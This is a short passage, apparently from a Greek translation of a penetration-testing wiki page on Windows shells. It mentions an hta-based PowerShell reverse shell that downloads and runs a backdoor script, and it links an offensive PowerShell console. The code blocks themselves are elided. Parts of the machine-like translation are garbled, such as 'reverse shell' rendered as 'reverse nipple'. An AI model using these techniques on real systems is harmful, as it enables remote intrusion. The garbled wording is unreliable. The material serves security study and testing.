...
```
#### **Παράδειγμα hta-psh αντίστροφης θηλής (χρησιμοποιήστε το hta για να κατεβάσετε και να εκτελέσετε το PS backdoor)**
```xml
...
Στο φάκελο **Shells**, υπάρχουν πολλές διαφορετικές θήκες. Για να κατεβάσετε και να εκτελέσετε το Invoke-_PowerShellTcp.ps1_, κάντε ένα αντίγραφο του σεναρίου και προσθέστε στο τέλος του αρχείου:
```
...
[PS>Attack](https://github.com/jaredhaight/PSAttack) κονσόλα PS με μερικά επιθετικά PS modules προφορτωμένα (κρυπτογραφημένα)\
